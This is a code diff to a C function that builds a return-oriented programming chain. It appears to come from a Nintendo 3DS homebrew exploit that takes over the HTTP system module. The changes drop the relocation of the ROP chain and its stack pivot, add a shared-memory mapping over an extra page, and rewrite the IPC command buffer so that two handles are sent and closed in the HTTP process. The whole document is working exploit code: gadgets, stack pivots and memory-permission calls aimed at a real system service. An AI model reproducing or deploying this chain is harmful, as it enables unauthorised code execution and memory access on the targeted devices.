@@ -324,10 +324,10 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 
 	ropgen_svcControlMemory(&ropchain, &http_ropvaddr, http_ropvaddr+12, new_ropvmem, 0, 0x1000, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
 
-	ropgen_memcpy(&ropchain, &http_ropvaddr, new_ropvmem, http_newropvaddr, 0x6d0);
+	//ropgen_memcpy(&ropchain, &http_ropvaddr, new_ropvmem, http_newropvaddr, 0x6d0);
 	ropgen_memcpy(&ropchain, &http_ropvaddr, ret2http_vaddr_new, ret2http_vaddr, 0x30);
 
-	ropgen_stackpivot(&ropchain, &http_ropvaddr, new_ropvmem);//Pivot to the relocated ROP-chain.
+	/*ropgen_stackpivot(&ropchain, &http_ropvaddr, new_ropvmem);//Pivot to the relocated ROP-chain.
 
 	if(http_ropvaddr > http_newropvaddr)
 	{
@@ -335,13 +335,17 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 		return -2;
 	}
 
-	http_newropvaddr = new_ropvmem;
+	http_newropvaddr = new_ropvmem;*/
 	ret2http_vaddr = ret2http_vaddr_new;
 
-	//The relocated ROP-chain starts here.
+	http_newropvaddr = http_ropvaddr;
+	new_ropchain = ropchain;
 
 	//Create sharedmem over the entire sysmodule heap, prior to the SOC-sharedmem.
 	ropgen_sharedmem_create(&new_ropchain, &http_newropvaddr, ret2http_vaddr+0xe0, 0x08000000, 0x22000, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);
+
+	//Create sharedmem over the new_ropvmem page.
+	ropgen_sharedmem_create(&new_ropchain, &http_newropvaddr, ret2http_vaddr+0xc0, new_ropvmem, 0x1000, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);
 
 	//Setup the custom vtable used by setuphaxx_httpheap_sharedmem().
 	ropgen_memcpy(&new_ropchain, &http_newropvaddr, __custom_mainservsession_vtable, ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE, ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE);
@@ -366,10 +370,10 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
 	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x4);//r0+= 0x4.
 	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x4
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[2] = 0x0
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0 | ((0x2-1)<<26));
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[2] = <translate-header for sending two handles which get closed in the HTTP process>
 
-	//Write the sharedmem handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
+	//Write the httpheap sharedmem handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
 	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, ret2http_vaddr+0xe0+0x14, 1);
 	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, http_newropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);
 
@@ -379,35 +383,51 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
 	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[3] = <value written by the above ROP>
 
+	//Write the new_ropvmem sharedmem handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
+	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, ret2http_vaddr+0xc0+0x14, 1);
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, http_newropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);
+
 	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
 	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xc);//r0+= 0xc.
 	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0xc
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[4] = <value written by the above ROP>
+
+	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
+	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x10);//r0+= 0x10.
+	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x10
 	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x10);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[4] = 0x10
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[5] = 0x10
 
 	//Write the ssl:C handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
 	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, ROP_SSLC_STATE + 24, 1);
 	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, http_newropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);
 
 	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
-	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x10);//r0+= 0x10.
-	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x10
+	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x14);//r0+= 0x14.
+	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x14
 	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[5] = <value written by the above ROP>
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[6] = <value written by the above ROP>
 
 	ropgen_stackpivot(&new_ropchain, &http_newropvaddr, ret2http_vaddr);//Pivot to the return-to-http ROP-chain.
 
-	if(http_newropvaddr > __custom_mainservsession_vtable)
+	if(http_newropvaddr > sharedmembase+0xfd0)
 	{
-		printf("http_newropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_newropvaddr - __custom_mainservsession_vtable));
+		printf("http_newropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_newropvaddr - (sharedmembase+0xfd0)));
 		return -2;
 	}
 
-	if(http_newropvaddr - new_ropvmem > 0x6d0)
+	/*if(http_newropvaddr > __custom_mainservsession_vtable)
+	{
+		printf("http_newropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_newropvaddr - __custom_mainservsession_vtable));
+		return -2;
+	}*/
+
+	/*if(http_newropvaddr - new_ropvmem > 0x6d0)
 	{
 		printf("The ROP data for http_newropvaddr is 0x%08x-bytes too large to fit in the allocated sharedmem area.\n", (unsigned int)((http_newropvaddr - new_ropvmem) - 0x6d0));
 		return -2;
-	}
+	}*/
 
 	regs[7] = 0x0011c418;//Set fp to the original value.
 
